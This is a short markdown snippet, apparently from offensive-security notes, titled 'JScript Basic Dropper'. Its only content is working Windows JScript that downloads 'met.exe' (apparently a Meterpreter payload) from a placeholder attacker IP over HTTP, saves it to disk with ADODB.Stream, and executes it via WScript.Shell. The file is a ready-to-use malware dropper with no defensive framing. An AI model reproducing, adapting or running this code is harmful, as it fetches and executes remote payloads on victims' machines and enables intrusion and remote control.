# JScript Basic Dropper

```JScript
var url = "http://192.168.x.x/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
	var Stream = WScript.CreateObject('ADODB.Stream');

	Stream.Open();
	Stream.Type = 1;
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;
	
	Stream.SaveToFile("met.exe", 2);
	Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```